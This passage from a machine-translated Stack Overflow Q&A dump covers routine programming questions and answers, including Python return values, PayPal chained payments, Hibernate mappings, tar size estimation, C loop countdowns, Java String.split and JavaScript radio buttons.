            cur.execute("UPDATE SANBROKER.Number_of_records  SET Archive_num=%s",(count))

        # ---------------------------------------------------------------------------------
        if decrease == 0:
            MatchPattern(count)

            # Now I wanna check some expresions (2 or 3)
            # After that i wanna write all the values into my database

            #------- ostatnie czynności:
            percentage = count / 100
            print "rekordów: " + str(count) + " z: " + str(counter) + " procent dodanych: " + str(percentage) + "%"  
            with con:
                cur = con.cursor()
                cur.execute("UPDATE SANBROKER.Number_of_records SET Old_num=%s",(count))
            decrease = 10-1
            count +=1
        else:
            MatchPattern(count)

            # Now I wanna check some expresions (2 or 3)
            # After that i wanna write all the values into my database

            # ------ ostatnie czynności:
            percentage = count / 100
            print "rekordów: " + str(count) + " z: " + str(counter) + " procent dodanych: " + str(percentage) + "%"
            with con:
                cur = con.cursor()
                cur.execute("UPDATE SANBROKER.Number_of_records SET Old_num=%s",(count))
            decrease -=1
            count +=1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:13:26.743

好吧，我假设 check_reg 是一个返回布尔值（True 或 False）的函数。

如果是这种情况，请检查退货：

```
if expr1:
   print "True."
else: 
   print "False" 
```

有不止一种方法可以做到这一点，但基本上，`if expr1:`您只需要进行检查即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:14:12.750

要捕获函数的返回值，请将函数分配给带有等号的名称，如下所示：

```
return_value = somefunction(some_value)
print('The return value is ',return_value) 
```

请记住，当`return`遇到第一条语句时，该函数将退出。因此，如果您有多个返回语句，则只有第一个将执行。

如果要返回多个事物，请将它们添加到列表中，然后返回列表。

这是您的功能的改进版本：

```
def match_pattern(count):

    sock = urllib.urlopen(Link+str(count))
    htmlsource = sock.read()                             
    sock.close()
    root = etree.HTML(htmlSource)
    # root = etree.HTML(htmlSource) - duplicate line
    # result = etree.tostring(root, pretty_print=True, method="html")
    function_names = [check_reg, check_practice, no_ks, Registered_by, \
                      Name_doctor, Registration_no, PWZL, NIP, Spec, Start_date, \
                      Name_of_practise, TERYT, Street, House_no2, Flat_no, \
                      Post_code2, City2, Phone_no]
    results = []
    for function in function_names:
         results.append(function(root))

    return results

r = match_pattern(1)
print r[0] # this will be the result of check_reg(root) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:14:35.343

您发布的代码非常模棱两可。您能否修复 ident，让我们知道什么属于函数，哪一部分是脚本。

一个函数只能返回一个值。你不能这样做：

```
return something
return something_else
return ... 
```

该函数将在返回第一个值时结束。您可以做的是返回包含所有值的列表、元组或字典。例如 ：

```
return (something,something_else,...) 
```

或者

```
return [something,something_else,...] 
```

在您的情况下，创建一个将您想要的所有值作为属性的类似乎更好，并将此函数转换为设置属性值的方法。

```
class Example(object):
    def __init__ ( self , link , count ):

        sock = urllib.urlopen(link+str(count))
        htmlSource = sock.read()                             
        sock.close()
        root = etree.HTML(htmlSource)
        root = etree.HTML(htmlSource)
        result = etree.tostring(root, pretty_print=True, method="html")

        self.expr1 = check_reg(root)
        self.expr2 = check_practice(root)
        self.D_expr1 = no_ks(root)
        ...
        self.D_expr8 = Start_date(root)

        #-----Reg_practice-----
        self.R_expr1 = Name_of_practise(root) 
        ...
        self.R_expr9 = Kind_of_practice(root)

        #------Serv_practice -----
        self.S_expr1 = TERYT2(root)
        ...
        self.S_expr7 = Phone_no(root) 
```

然后你就可以像这样使用这个类：

```
exampleInstance = Example ( "link you want to use" , 4 ) # the second argument is your 'count' value

# Now you can use attributes of your class to get the values you want
print exampleInstance . expr1
print exampleInstance . S_expr7 
```

# python - Paypal 自适应延迟链式支 付

> ID：16184572
> 
> 赞同：0
> 
> 时间：2013-04-24T06:10:09.887
> 
> 标签：python, paypal, paypal-adaptive-payments

我正在使用贝宝延迟链式付款，我已在指定 PAY_PRIMARY 操作类型中附加了代码片段，因此该场景将第一人和第二人的数量相加，但在我的情况下，它需要主要接收方金额而不是辅助接收方金额相加。

主要收款人数量 =10 次要收款人数量 = 5

重定向到贝宝后，我支付的金额为 10，而不是 15。

我需要你们的任何想法和建议。在我的代码下面

```
receivers = []
receivers.append({'amount':amounts, 'email':"egroveqa1@gmail.com",'primary':'true'})
receivers.append({'amount':amounts, 'email':"kavirajan@egrovesystems.com",'primary':'false'})
print receivers
response = paypal.pay(actionType = 'PAY_PRIMARY',
            cancelUrl = "urlofmywebsite",currencyCode = 'USD',
            feesPayer = 'PRIMARYRECEIVER',receiverList = {'receiver': receivers},
            returnUrl = "urlofmywebsite",
            ipnNotificationUrl = "urlofmywebsite",
            errorLanguage = "en_US") 
```

出于安全问题，我添加了示例 url 而不是网站的原始 url。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-11T04:20:09.257

这不是链式支付的运作方式。您应该向主要收款人支付总金额，您为次要收款人指定的金额将被注册为主要收款人的付款。

资金流向如下：

`[payer] => [primary receiver] => [secondary receiver]`

付款人只会知道向主要收款人付款的情况。

# mysql - 向自引用父/子添加一对多关系

> ID：16184580
> 
> 赞同：0
> 
> 时间：2013-04-24T06:10:33.677
> 
> 标签：mysql, spring, hibernate

使用 Spring 和 Hibernate，我可以在自引用类和另一个类中的父/子之间实现一对多的关系。也就是说，这是自引用类：

D B：

```
 CREATE TABLE `employee` (
  `employee_id` BIGINT(10) NOT NULL AUTO_INCREMENT,
  `name` VARCHAR(50) NULL DEFAULT NULL,
  `manager_id` BIGINT(20) NULL DEFAULT NULL,
  PRIMARY KEY (`employee_id`),
  CONSTRAINT `FK_MANAGER` FOREIGN KEY (`manager_id`) REFERENCES `employee`    

  (`employee_id`)) 
```

模型：

```
 @Entity
  @Table(name="employee")
  public class Employee {

  @Id
  @Column(name="employee_id")
  @GeneratedValue
  private Long employeeId;

  @Column(name="name")
  private String name;

  @ManyToOne(cascade={CascadeType.ALL})
  @JoinColumn(name="manager_id")
  private Employee manager;

  @OneToMany(mappedBy="manager")
  private Set<Employee> employee = new HashSet<Employee>(); 
```

现在我想为父/子（经理/员工）和另一个像这样的类创建一对多的关系：

```
 @OneToMany(mappedBy="manager")
  private List<Course> course = new ArrayList<Course>();

  @OneToMany(mappedBy="lecturer")
  private List<Course> courses = new ArrayList<Course>(); 
```

因此，经理和员工都将与一门或多门课程相关联。课程类别：

```
 @Entity
  @Table(name = "courses")
  @Component
  public class Course implements Serializable

  @ManyToOne
  @JoinColumn(name="employee_id", insertable=false, updatable=false)
  private Employee employee;

  @ManyToOne
  @JoinColumn(name="manager_id", insertable=false, updatable=false)
  private Employee manager; 
```

这是我正在尝试实现的概述，但我想知道这是否可行，如果可以，我将如何在数据库关系中设置它，并能够通过休眠将关系保存到数据库。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T17:36:53.573

```
@OneToMany(mappedBy="manager") 
private List<Course> managedCourses = new ArrayList<Course>();

@OneToMany(mappedBy="lecturer")
private List<Course> lectuedCourses = new ArrayList<Course>(); 
```

...

```
@Entity
@Table(name = "courses")
@Component
public class Course implements Serializable

@ManyToOne
@JoinColumn(name="lecturer_id", insertable=false, updatable=false)
private Employee lecturer;

@ManyToOne
@JoinColumn(name="manager_id", insertable=false, updatable=false)
private Employee manager; 
```

# tar - tar 预运行以评估预期的文件大小或数量

> ID：16184583
> 
> 赞同：8
> 
> 时间：2013-04-24T06:10:42.883
> 
> 标签：tar, evaluate

问题：我有一个后端进程，他有时会收集并构建一个大的 tar 文件。这个 tar 接收几个目录和一个排除文件。该过程可能需要几分钟，我想在我的前端过程 (GUI) 中报告去皮过程的进度（这对于按下下载按钮的用户来说是一个大问题，似乎什么都没有发生。 ..)。

我知道我可以在 tar 命令中使用 -v -R 并计算文件和大小进度，但我正在寻找某种 tar 预运行模式/空运行来帮助我评估预期的文件数量或预期的 tar 大小.

我正在使用的命令：`tar -jcf 'FILE.tgz' 'exclude_files' 'include_dirs_and_files'`

每个愿意提供帮助的人都可以获得 10 倍。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-12-09T17:13:44.873

您可以将输出通过管道传输到`wc`工具，而不是实际制作文件。

带有文件列表（详细）：

```
[git@server]$ tar czvf - ./test-dir | wc -c
./test-dir/
./test-dir/test.pdf
./test-dir/test2.pdf
2734080 
```

没有：

```
[git@server]$ tar czf - ./test-dir | wc -c
2734080 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-07T07:49:10.547

你为什么不运行一个

```
DIRS=("./test-dir" "./other-dir-to-test")
find ${DIRS[@]} -type f | wc -l 
```

预先。这将获取所有文件 ( `-type f`) 每行一个并计算文件数。DIRS 是 bash 中的数组，因此您可以将文件夹存储在变量中

如果您想知道所有存储文件的大小，可以使用`du`

```
DIRS=("./test-dir" "./other-dir-to-test")
du -c -d 0 ${DIRS[@]} | tail -1 | awk -F ' ' '{print $1}' 
```

这将打印磁盘使用情况`du`，计算总计（`-c`标志），获取最后一行（示例`4378921 total`），并仅使用第一列`awk`

# recursion - Need a little help for this scheme "leet-speak"

> ID：16184586
> 
> 赞同：0
> 
> 时间：2013-04-24T06:10:53.650
> 
> 标签：recursion, map, scheme

I wrote a program below for "Define a procedure leet-speak takes a string and returns the result of changing all s's to fives, all e's to threes, all l's to ones, and all o's to zeros. Do not write any recursive code to do this. Simply make use of `string->list`, `map`, and `list->string`."

The error I got is:

```
 ~ (leet-speak "leet speak neat speak")
 Exception: attempt to apply non-procedure (1 3 3 #\t #\space 5 ...) 
```

Here is my definition for `leet-speak`:

```
(define leet-speak
  (lambda (y)
    (list->string 
      ((map 
         (lambda (x)
           (cond
             [(eq? #\l x) 1]
             [(eq? #\s x) 5]
             [(eq? #\o x) 0]
             [(eq? #\e x) 3]
             [else x])
           ) (string->list y ))))) 
```

I really can't find out where the problem is.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:16:18.807

.周围的括号太多`map`。删除多余的，以便在 之前只有一个括号`map`，你应该很高兴。

您`cond`还需要返回与数字对应的*字符，而不是数字本身。*另外，请考虑使用 a`case`而不是`cond`您拥有的。

总而言之，它的外观如下：

```
(define (leet-speak str)
  (list->string 
   (map (lambda (x)
          (case x
            [(#\l) #\1]
            [(#\s) #\5]
            [(#\o) #\0]
            [(#\e) #\3]
            [else x]))
        (string->list str)))) 
```

# php - What is the difference between real_escape_string() and mysql_real_escape_string()?

> ID：16184587
> 
> 赞同：0
> 
> 时间：2013-04-24T06:11:00.320
> 
> 标签：php, mysql, sql

I am surprised to find out that this hasn't been asked

also is either enough to protect against SQL injection?

Thank you

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:43:42.537

I'm guessing you're using mysql or mysqli, you should switch over to PDO and use prepare statements instead of escaping it.

As requested. You should have a look at [this site](http://net.tutsplus.com/tutorials/php/why-you-should-be-using-phps-pdo-for-database-access/).

```
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$STH = $DBH->prepare("INSERT INTO users (username, password) values (:username, :password)");
$STH->bindParam(':username', $username);
$STH->bindParam(':password', $password);
$STH->execute();
?> 
```

# android - 通过在android中使用achartEngine在android中的图形碰撞点

> ID：16184597
> 
> 赞同：1
> 
> 时间：2013-04-24T06:11:33.723
> 
> 标签：android, android-canvas, achartengine, android-custom-view

在我的android应用程序中，我使用aChartEngine android开发了Graph功能。一切都很好。我需要在图中的两个时间序列碰撞点上画一个圆圈。下面我显示了应用程序的屏幕热点。请帮助我![在此处输入图像描述](https://i.stack.imgur.com/5YWWY.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T07:59:57.830

有一件事是肯定的：AChartEngine 不会为您提供用于检测两条线之间的交点的 API。

如果您可以自己计算，那么您可以添加第三个系列，其中一个点将呈现交点。您必须为这个系列设置一个点样式，这样您才能更好地看到它。

# jquery - JQueryUI Autocomplete populate number of textboxes

> ID：16184599
> 
> 赞同：0
> 
> 时间：2013-04-24T06:11:40.353
> 
> 标签：jquery, json, jquery-ui, jquery-ui-autocomplete

Let say i have 3 textboxes :

1.  product
2.  buyPrice
3.  sellPrice

the product textbox is autocomplete and it works well already, but i want to populate default buyPrice and default sellPrice which i can get from my table and i can include that in json i return. Is it possible?? i googled it but still can't find good example on it.

this is piece of my code :

```
$( "#product" ).autocomplete({
    source: '/product/product'
}); 
```

sample of my Product list json :

```
["x10","f10","f25"] 
```

And 1 more question. Is it possible that i preload My Product List so it no need to go to server everytime user type something in product textbox?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:46:00.260

使用自动完成的[选择](http://api.jqueryui.com/autocomplete/#event-select)事件。

您得到的响应无法与自动完成器一起正常工作。根据文档，[源](http://api.jqueryui.com/autocomplete/#option-source)需要返回一个带有附加字段的 json 对象，而不是一个简单的数组。像这样：

```
{
    value: "jquery",
    label: "jQuery",
    buy:   100,
    sell:  200
  }, 
```

然后在选择回调中，您可以使用这些字段，例如

```
 select: function( event, ui ) {
    $( "#project" ).val( ui.item.label );
    $("#buyPrice").val( ui.item.buy );
    $("#sellPrice").val( ui.item.sell );

    return false;
  } 
```

示例[小提琴](http://jsfiddle.net/HN38B/)

# jquery - 如何用on替换livequery？

> ID：16184601
> 
> 赞同：2
> 
> 时间：2013-04-24T06:11:54.097
> 
> 标签：jquery

我们可以使用 on() 函数代替 livequery 插件吗？如果可能的话，我怎么能在这里使用 on() ；

```
$('.layout_block').livequery(function(){
    $(this).resizable({
        // ...
    });
}); 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-24T06:17:52.400

例如，根据[文档](http://docs.jquery.com/Plugins/livequery)，您可以绑定单击事件。

```
$('a').livequery('click', function(event) { 
   // your code
}); 
```

由于 livequery 被设计为一个插件，允许您将相同的事件添加到动态添加的元素中，因此不能用 jQuery 的默认 on() 函数替换它。否则，插件应该没用。

因此，要对您的评论做出反应……如果您不需要 livequery 的功能，请不要使用它并使用本机 on() 功能。

# mips - 动态内存分配和释放 MIPS

> ID：16184602
> 
> 赞同：2
> 
> 时间：2013-04-24T06:12:04.040
> 
> 标签：mips, dynamic-memory-allocation

用于动态分配内存的 MIPS 代码。

我需要编写一个主程序，通过控制台循环等待用户的请求，以便为具有名称的变量分配/释放大小的内存，并相应地调用分配或释放过程。分配过程分配一个可用的内存块（即未分配给另一个变量的块），并更新它的表以指示其内存的哪些部分分配给哪些变量，以及哪些内存部分仍然可用。当主程序请求释放过程释放分配给变量的一部分内存时，该过程会将先前分配给该变量的内存部分标记为空闲。分配和解除分配请求可能以任何顺序来自用户，

我的假设是： 1\. 内存池非常有限，比如 2048 字节。2\. 池被划分为大小相等的小块（例如，每个 32 字节，因此在 2048 字节的池中将有 64 个块）。3\. 尽管内存请求可以来自任何大小，但分配总是以整数个块完成。也就是说，如果一个 100 字节的请求到来，则分配 128 字节（或 4 个块）。

PS：我只需要一个想法来写在mips中。请帮忙！

# c - 无法通过使用 i-- 从 argc 开始倒数到 0 来使这些循环倒数

> ID：16184603
> 
> 赞同：1
> 
> 时间：2013-04-24T06:12:06.287
> 
> 标签：c, while-loop, segmentation-fault

我遇到了一件棘手的事情。这是原始程序：

```
#include <stdio.h>
int main(int argc, char *argv[])
{
    // go through each string in argv

    int i = 0;
    while(i < argc) {
        printf("arg %d: %s\n", i, argv[i]);
        i++;
    }

    // let's make our own array of strings
    char *states[] = {"cali","heo","arb","flu"};

    int num_states = 4;
    i = 0;  // watch for this
    while(i < num_states) {
        printf("state %d: %s\n", i, states[i]);
        i++;
    }

    return 0;
} 
```

以下是链接中提出的问题：http: [//c.learncodethehardway.org/book/ex11.html](http://c.learncodethehardway.org/book/ex11.html)

> 通过使用 i-- 从 argc 开始倒数到 0，使这些循环倒数。您可能需要做一些数学运算才能使数组索引正常工作。

针对上面提到的这个问题，我对上面的程序进行了修改。在下面的代码中，我只能执行 1 个 while 循环。我无法执行这两个循环。请纠正我的代码。

我使用`valgrind`了调试工具。

```
#include <stdio.h>
int main(int argc, char *argv[])
{
    int i = 2;
    while(i < argc) {
        printf("arg %d: %s\n", i, argv[i]);
        i--;
    }

    char *states[] = {
        "cali","heo","arb","flu"
    };

    int num_states = 4;
    i = 3;  // watch for this
    while(i < num_states) {
        printf("state %d: %s\n", i, states[i]);
        i--;
    }

    return 0;
} 
```

输出：

```
$ make while
$ ./while hey how
2 how 
1 hey 
0 ./while 
Segmentation fault (core dumped)
$ 
```

而对于另一种输出方式——

```
$ ./while
3 flu
2 arb 
1 heo 
0 cali 
Segmentation fault (core dumped)
$ 
```

因此，我声称我“无法以上述方式同时执行两个 while 循环”。我已经初始化`i=2`并且它被递减并且我已经将`i`值重新初始化为 3。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:21:13.423

在and部分的`while`循环条件下，您的逻辑很糟糕。将它们更改为或在两种情况下都更改为或简单地更改，因为它最终变为 0。`while(i<argc)``while(i<num_states)``while(i>=0)``while(i)``i--`

```
#include <stdio.h>
  int main(int argc, char *argv[])
{
int i = 2;   // If OP is certain argc is 2!Better use i=argc instead
while(i >= 0)   //Error was  here 
{
    printf("arg %d: %s\n",argc-i, argv[argc-i]); // alteration here
    i--;
}

char *states[] = {
    "cali","heo","arb","flu"
};

int num_states = 4;
i = 3;  // watch for this
while(i >=0) {  //alteration here
    printf("state %d: %s\n", num_states-i, states[num_states-i]); // Here too
    i--;
}

return 0;} 
```

**注意：**在`while(i < num_states)`你的第二个程序中肯定会造成很大的麻烦，因为每次都会满足条件，`i`每次迭代后减少 1 并`num_states`保持固定为 4。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:18:55.440

循环的想法是从`i`设置为最大值开始，并`i`在每次迭代时递减：

```
i = argc;
while (--i >= 0)
    printf("arg %d: %s\n", i, argv[i]);

i = 4;
while (--i >= 0)
    printf("state %d: %s\n", i, states[i]); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:20:35.857

以下代码：

```
while(i < num_states) { <---------------------- HERE
    printf("state %d: %s\n", i, states[i]);
    i--;
} 
```

您实际上是在倒计时并检查**不正确**的值。

一定是：

```
 while(i >= 0) 
```

这里：

```
while(i < argc) {
    printf("arg %d: %s\n", i, argv[i]);
    i--;
} 
```

相同：

```
while(i >= 0) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T06:22:51.460

```
int max = 4;
int i = max;
while(i > 0)
{
    // backward count
    cout << "state " << i << " " << states[i-1] << endl;
    printf("state %d %s\n", i, states[i-1]);

    // forward count
    cout << "state " << max-i << " " << states[max-i] << endl;
    printf("state %d %s\n", max-i, states[max-i]);
    i--;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-24T06:28:56.097

由于条件是

```
while(i < num_states) 
```

并且你要递减 i，这个条件*总是*（并不总是）为真。当 i==-1 时，你将要访问`states[-1]`，你应该阻止它。

代码应如下所示：

```
 i = num_states - 1;
 while (i >= 0) 
```

这样，您当然可以以相反的顺序输出数组。要产生相同的输出，您可以改为执行以下操作：

```
int num_states = 4;
i = num_states - 1; 
while( (num_states - i - 1) < num_states) {
    printf("state %d: %s\n", num_states - i - 1, states[num_states - i - 1]);
    i--;
} 
```

即使它看起来像一个代数技巧。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-24T06:34:53.600

分段错误是由于在 i 为负数时尝试调用 argv[i]（或 states[i]），但这是因为循环结构的逻辑缺陷。

例如，在第一个循环中：

```
int i = 2;
while(i < argc) {
    printf("arg %d: %s\n", i, argv[i]);
    i--;
} 
```

例如，假设 argc 为 4。您的代码所做的是告诉循环在每次 i 小于 4 时重复。而且，由于 i 从 2 开始并且每次都下降，因此该循环可以永远重复。循环条件将始终评估为真。但是，由于最终 i 变为负数并且您尝试将其用作数组索引，因此会产生分段错误。修复它的最简单方法是：

```
int i = argc-1;
while(i >= 0) {
    printf("arg %d: %s\n", i, argv[i]);
    i--;
} 
```

这样，我从 argv 的最后一个索引开始（即 argc-1，因为 argc 是数组中的元素数，而 argv 是从元素 0 开始的数组。例如，如果 argc 为 5，则此代码将通过 argv[0] 打印 argv[4])

我发现考虑 while 循环的最佳方式是使用基本英语。“在 y 为真时继续重复 x”。在您的代码中， y 始终为真，因此 x 会一直重复（或者，在这种情况下，直到出现分段错误）。

看看您是否也可以将此逻辑应用于其他循环。玩得开心学习c！

# c# - 用多个逗号匹配价格

> ID：16184604
> 
> 赞同：4
> 
> 时间：2013-04-24T06:12:08.130
> 
> 标签：c#, regex

我想匹配其中包含多个逗号的值。我只能用 1 个逗号匹配值。正则表达式：`(\$\d+\,\d+)` 示例值：`$567,76` 但我需要匹配此值`$567,76,87`，但此正则表达式不起作用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-24T06:13:52.170

试试这个模式，也许它会有所帮助。

```
^\$\d+(,\d+)*$ 
```

这将匹配

```
$567
$567,76
$567,76,87 
```

但不是

```
$567,76,87, 
```

*   [正则表达式演示（*点击`.Net`按钮*）](http://fiddle.re/0n1j6)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:14:42.413

`double.Parse(currency, NumberStyles.Currency)`您可以使用而不是使用正则表达式来解析值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T06:15:18.457

试试这样；

```
^\$\d+(,\d+)+$ 
```

一些随机匹配；

```
$1622,40,749
$37,5844 
```

* * *

```
Regex r = new Regex(@"^\$\d+(,\d+)+$");

string[] partNumbers = { "$567,76", "$567,76,87", "$567,76,87," };
foreach (var i in partNumbers)
{
       Console.WriteLine("{0} {1} a valid part number.", i, r.IsMatch(i) ? "is" : "is not");
} 
```

* * *

```
$567,76 is a valid part number.
$567,76,87 is a valid part number.
$567,76,87, is not a valid part number. 
```

这是一个[`DEMO`](http://ideone.com/vKxCgC).

# azure - 从 wp7 应用程序将大尺寸图像上传到天蓝色时出错

> ID：16184615
> 
> 赞同：0
> 
> 时间：2013-04-24T06:12:43.193
> 
> 标签：azure

我必须将任何大小的图像上传到天蓝色云服务。在本地，我已经在相应的配置文件中进行了更改并成功上传到服务，也到 blob。然后我发布了服务。现在我在将图像上传到此服务时遇到错误。

"errorMessage":"远程服务器返回错误：(400) Bad Request。" 这是我收到的错误消息。我已经在服务的 web.config 中进行了这些更改，然后我能够成功上传。然后我发布了服务。但是对于这个服务，我无法上传大尺寸（大于 200*200）

```
 <system.web>
    <compilation debug="true" targetFramework="4.0" />
    <httpRuntime executionTimeout="4800" maxRequestLength="2147483647"/>
  </system.web>
  <system.serviceModel>
    <serviceHostingEnvironment  aspNetCompatibilityEnabled="true">
    </serviceHostingEnvironment>
    <standardEndpoints>
      <webHttpEndpoint>
        <!--<standardEndpoint name="" helpEnabled="true" crossDomainScriptAccessEnabled="true" faultExceptionEnabled="true" >
        </standardEndpoint>-->
        <standardEndpoint name="" maxReceivedMessageSize="2147483647" helpEnabled="true" crossDomainScriptAccessEnabled="true" faultExceptionEnabled="true" >
        </standardEndpoint>
      </webHttpEndpoint>
    </standardEndpoints>
    <bindings>
      <basicHttpBinding>
        <binding  transferMode="Streamed" closeTimeout="00:10:00" maxBufferPoolSize="2147483647" maxReceivedMessageSize="2147483647" openTimeout="00:10:00" receiveTimeout="00:10:00" sendTimeout="00:10:00" messageEncoding="Text">
          <readerQuotas maxDepth="2147483647" maxStringContentLength="2147483647" maxBytesPerRead="2147483647" maxNameTableCharCount="2147483647" maxArrayLength="2147483647"/>
        </binding>
      </basicHttpBinding>
    </bindings>
  </system.serviceModel>
  <system.webServer>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2147483647"></requestLimits>
      </requestFiltering>
    </security> 
```

# java - Java - Split string

> ID：16184617
> 
> 赞同：2
> 
> 时间：2013-04-24T06:12:45.193
> 
> 标签：java, string, split

i have string which is separated by `"."` when i try to split it by the `dot` it is not getting spitted.

Here is the exact code i have. Please let me know what could cause this not to split the string.

```
public class TestStringSplit {
    public static void main(String[] args) {
        String testStr = "[Lcom.hexgen.ro.request.CreateRequisitionRO;";
        String test[] = testStr.split(".");
        for (String string : test) {
            System.out.println("test : " + string);
        }
        System.out.println("Str Length : " + test.length);
    }
} 
```

I have to separate the above string and get only the last part. in the above case it is `CreateRequisitionRO` not `CreateRequisitionRO;` please help me to get this.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T06:16:35.947

您可以拆分此字符串`StringTokenizer` 并获取点之间的每个单词

```
StringTokenizer tokenizer = new StringTokenizer(string, ".");
String firstToken = tokenizer.nextToken();
String secondToken = tokenizer.nextToken(); 
```

正如你正在寻找最后一个字**CreateRequisitionRO**你也可以使用

```
String testStr = "[Lcom.hexgen.ro.request.CreateRequisitionRO;";
String yourString = testStr.substring(testStr.lastIndexOf('.')+1, testStr.length()-1); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-24T06:14:56.300

```
String testStr = "[Lcom.hexgen.ro.request.CreateRequisitionRO;";
String test[] = testStr.split("\\.");
for (String string : test) {
    System.out.println("test : " + string);
}
System.out.println("Str Length : " + test.length); 
```

这 ”。” 是一个正则表达式通配符，您需要对其进行转义。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-24T06:15:09.513

请注意，它[`String.split`](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#split%28java.lang.String%29)接受[正则表达式](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/regex/Pattern.html)，并且`.`在正则表达式中具有特殊含义（[匹配除行分隔符之外的**任何字符**](https://stackoverflow.com/questions/16150214/when-does-not-match-in-a-regex/16150779#16150779)），因此您需要对其进行转义：

```
String test[] = testStr.split("\\."); 
```

请注意，您`.`在正则表达式级别转义一次：`\.`，并且要`\.`在字符串文字中指定，`\`需要再次转义。所以要传递给的字符串`String.split`是`"\\."`.

或者另一种方法是在一个字符类中指定它，其中`.`失去了它的特殊含义：

```
String test[] = testStr.split("[.]"); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-24T06:14:28.120

更改`String test[] = testStr.split(".");`为`String test[] = testStr.split("\\.");`。

由于[String.split](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#split%28java.lang.String%29)的参数采用正则表达式参数，因此您需要转义点字符（这意味着正则表达式中的通配符）：

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-04-24T06:16:27.760

您需要转义，`.`因为它是一个特殊字符，可以使用[它们的完整列表](http://tutorials.jenkov.com/java-regex/syntax.html)。您的分割线需要是：

```
String test[] = testStr.split("\\."); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-24T06:17:42.017

Split 将正则表达式作为参数。如果你想用文字“.”分割，你需要转义点，因为它是正则表达式中的特殊字符。尝试在您的点之前放置 2 个反斜杠（“\\.”） - 希望这可以满足您的需求。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-04-24T06:18:21.317

```
String test[] = testStr.split("\\."); 
```

# database - Perl 中的 Selenium 数据驱动测试

> ID：16184619
> 
> 赞同：-1
> 
> 时间：2013-04-24T06:13:03.827
> 
> 标签：database, perl, selenium, testing, data-driven-tests

需要有关如何使用*Excel*和通过连接到*数据库*进行数据驱动测试的帮助。

也无法使用测试工具：

```
Can't locate Test/TAP/HTMLMatrix.pm in @INC (@INC contains: D:\Test-WWW-Selenium-1.35\Test-WWW-Selenium-1.35\lib C:/Perl/site/lib C:/Perl/lib .) at Reporttest.pl line 7.
BEGIN failed--compilation aborted at Reporttest.pl line 7. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:52:15.973

Selenium 不直接支持数据驱动测试。简而言之，我们可以说它用于与浏览器进行交互。我们可以使用测试框架来实现数据驱动，例如`TestNg, Junit etc...`. 否则，我们可以通过任何编程语言来做到这一点。

我正在使用测试框架 TestNG 从中检索数据，`Excel`并使用 java 代码从中检索数据`DB`。

单击此[链接](http://diveintotesting.com/2013/02/23/parameterizing-selenium-webdriver-tests-using-testng-a-data-driven-approach/)以获取 excel 数据驱动。

只是谷歌你会得到很多关于这个问题的论坛和博客。

# javascript - 在 IE 的 Html 中动态创建单选按钮

> ID：16184621
> 
> 赞同：1
> 
> 时间：2013-04-24T06:13:14.327
> 
> 标签：javascript, html, dynamic, radio-button

谁能给我一个工作代码，用于在 IE、Firefox 和 Chrome 中工作的 html（和 javascript）中创建动态单选按钮？

我在互联网上看到了很多代码，但没有一个对我有用。

我还需要他们有一个标签。而且我不想使用 Jquery。

试过这段代码：

```
function test() {
var element = document.createElement("input");
//Assign different attributes to the element.
element.setAttribute('type', 'radio');
element.setAttribute('value', 'source');
element.setAttribute('name', 'source'); 
element.setAttribute('id', 'source_id');
var foo = document.getElementById("divTxt");
foo.appendChild(element);
var newlabel2 = document.createElement("Label"); 
newlabel2.for = "source_id";
newlabel2.innerHTML = "first name ";
foo.appendChild(newlabel2);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T06:19:15.517

```
var radio1 = document.createElement('input');
radio1.id = 'myRadioId1';
radio1.type = 'radio';
radio1.name = 'radioGroup';
radio1.value = 'someValue1';

var radio2 = document.createElement('input');
radio2.id = 'myRadioId2';
radio2.type = 'radio';
radio2.name = 'radioGroup';
radio2.value = 'someValue2';

var label1 = document.createElement('label');
label1.htmlFor = radio1.id;
label1.innerHTML = 'label for radio1';

var label2 = document.createElement('label');
label2.htmlFor = radio2.id;
label2.innerHTML = 'label for radio2'; 
```

附加到容器：

```
var container = document.getElementById('mydivid');
container.appendChild(radio1);
container.appendChild(label1);
container.appendChild(radio2);
container.appendChild(label2); 
```

如果你需要广播组，你应该给他们相同的名字。这是[小提琴](http://jsfiddle.net/jphYt/1/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T07:34:59.687

